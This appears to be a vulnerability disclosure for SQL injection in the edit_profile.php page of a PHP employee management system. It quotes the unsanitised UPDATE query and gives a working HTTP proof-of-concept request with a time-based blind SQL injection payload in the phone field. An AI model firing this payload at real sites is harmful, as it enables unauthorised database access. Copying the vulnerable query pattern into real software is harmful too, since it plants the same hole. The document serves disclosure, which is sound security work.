### Vulnerability file address

`Admin/edit_profile.php` from line 12,The `$phone` parameter is controllable,, and the `$phone` is not protected from sql injection, line 14 `$sql = " update users set fullname='$fullname',phone='$phone' where username='$username'";` ,line 15 `mysqli_query($conn, $sql)`Line 15 performs a SQL query, causing SQL injection

```php
<?php
include('../inc/topbar.php');
if(empty($_SESSION['admin-username']))
    {
      header("Location: login.php");
    }

if(isset($_POST['btnupdate']))
{

$fullname=$_POST['txtfullname'];
$phone=$_POST['txtphone'];

$sql = " update users set fullname='$fullname',phone='$phone' where username='$username'";
if (mysqli_query($conn, $sql)) {

header( "refresh:2;url= edit_profile.php" );
$_SESSION['success'] ='User Edited Successfully';
}else{
$_SESSION['error'] ='Problem Saving changes';
}
```

### POC

```http
POST /CMS/php/employee_akpoly/Admin/edit_profile.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://10.0.0.20:82
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Admin/edit_profile.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

txtfullname=123&txtphone=123' AND (SELECT 9637 FROM (SELECT(SLEEP(5)))RKIJ)-- mEjS&old_image=uploadImage/1.php&btnupdate=
```

### Attack results pictures

![image-20250128161700419](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501281617460.png)